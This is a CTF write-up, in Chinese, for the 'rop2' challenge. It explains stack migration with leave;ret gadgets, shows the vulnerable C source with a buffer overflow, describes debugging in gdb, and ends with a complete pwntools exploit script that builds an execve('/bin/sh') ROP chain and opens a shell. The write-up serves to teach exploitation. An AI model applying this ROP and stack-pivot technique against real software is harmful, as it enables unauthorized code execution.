---
title: lys rop2 Writes up
published: 2024-08-08
tags: [CTF]
category: Cyber Security
draft: false
image: 'image.png'
---


### Stack Migration

當今天在串 rop gadget 的時候發現字串的大小不夠你塞，你可以用 leave ; ret 去跳到另外一個有空間 Stack 上

|  gadget   | 意思 |
|  ----  | ----  |
| leave  | mov rsp , rbp; pop rbp |
| ret  | pop rip |


### Recon

file:
![image](https://hackmd.io/_uploads/ByPV2fW5R.png)

checksec:
![image](https://hackmd.io/_uploads/r1CBnGWqA.png)

source.c:

```c=
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

char name[0x100];

size_t readbuf(char *buf, size_t len)
{
    size_t i=0;
    while(i<len){
        if(read(0,&buf[i],1)!=1){
            break;
        }
        if(buf[i]=='\n'){
            buf[i] = 0;
            break;
        }
        i++;
    }
    return i;
}

int main()
{
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stdout, 0, _IONBF, 0);
    //printf("Gift: ")
    printf("What is your name? ");
    readbuf(name, 0x100);
    printf("Hello, %s\n", name);
    char buf[0x10];
    printf("You have a buffer overflow vuln: ");
    readbuf(buf, 0x20);
    return 0;
}
```

我們發現在 ```"You have a buffer overflow vuln: "```的 buf 大小是 10 ，但是他用 readbuf(buf,0x20) 去讀，所以導致了 buffer overflow 但是 buf 讀取的大小並不夠我們串好完整的 rop gadget ， 但是我們可以利用 Stack Migration 去達到 call execve ， 此外，這一題也是 statically linked，所以很好找到 gadget

這邊是 lys 簡報上的示意圖

這是我們第一次做完 leave 的時候:

![image](https://hackmd.io/_uploads/r1U1j3-q0.png)

這是我們第一次做完 ret 的時候:

![image](https://hackmd.io/_uploads/H1uminbcR.png)

會發現我們需要做兩次的 <font color="#f00"> leave ret; </font> 才可以讓我們的 rop gadget 跳到一個有空間的地方 ，至於為啥不用寫兩個 leave ret; 在 exp 裡面是因為程式本身就有做一次 leave ret; 了

![image](https://hackmd.io/_uploads/Sy9l6nb5A.png)


第一個 read 的時候因為 size 比較大，固被我們當作塞整串 ROP 的地方


```py=
r.sendlineafter('?','/bin/sh\x00'+p) #/bin/sh\x00 寫到 rdi 上ㄌ
```

第二個 read 因為空間不夠我們塞，所以是讓我們拿來跳轉到上面那一個 read 的地方

```py=
r.sendlineafter(':','a'*0x10+name+leave)
```

Stack 樣子:

```
               Stack grows down ↓

[ message (0x10 bytes) ]        <- buffer 開頭
[ saved RBP (8 bytes) ]         <- 被 p64(name) 蓋掉
[ return address (8 bytes) ]    <- 被 p64(leave_ret) 蓋掉


```

### debug 

一開始的 exp 的部分是

```py
r.sendlineafter('?','/bin/sh'+p)
```

會發程式爛掉ㄌ，所以就 gdb attach 上去看

下個斷點在 leave 前面

![leave](https://hackmd.io/_uploads/SyFsW0bqC.png)

發現程式有動到 migration 的部分，但是會發現 migration 之後就沒有一個所以然ㄌ

![bug1](https://hackmd.io/_uploads/H1gkMR-5R.png)

![bug2](https://hackmd.io/_uploads/SyrlfCWqR.png)

後面加上去 \x00 之後會發現程式正常的運作我們的　rop gadget

![solve1](https://hackmd.io/_uploads/rJFqfA-90.png)

![solve2](https://hackmd.io/_uploads/BJWhfRW9A.png)

## exploit

```py
from pwn import *

context(arch="amd64")

r=process('./rop2')


p=''

name=p64(0x4C7300)
pop_rax=p64(0x000000000044fd87)+p64(0x3b)
pop_rdi=p64(0x0000000000401f4f)+name
pop_rsi=p64(0x0000000000409f7e)+p64(0x0)
pop_rdx_pop_rbx=p64(0x0000000000485bab)+p64(0x0)+p64(0x0)
leave=p64(0x00000000004017ee)

syscall=p64(0x401d04)



p+=pop_rax+pop_rdi+pop_rsi+pop_rdx_pop_rbx+syscall


#pause()

r.sendlineafter('?','/bin/sh\x00'+p)

#pause()

r.sendlineafter(':','a'*0x10+name+leave)


r.interactive()
```

### pwned!

![image](https://hackmd.io/_uploads/SysZ7C-9C.png)
